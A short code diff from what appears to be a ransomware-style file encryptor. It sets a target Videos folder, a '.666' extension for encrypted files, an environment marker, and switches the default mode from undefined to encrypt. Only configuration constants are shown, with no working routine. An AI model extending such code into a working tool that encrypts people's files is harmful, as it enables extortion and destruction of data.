@@ -5,11 +5,11 @@
 #define RELATIVE_FOLDER "\\Videos"
 #define CRYPTO_EXT ".666"
 #define CRYPTO_EXT_LEN 4
-#define CRYPTO_ENV_VALUE "666" /* this too */
+#define CRYPTO_ENV_VALUE "666" /* i will make this more secure */
 
 char ascii[] = "ascii art here";
 
-int encrypt = -1;
+int encrypt = 1;
 /*
 1 = encrypt
 0 = decrypt
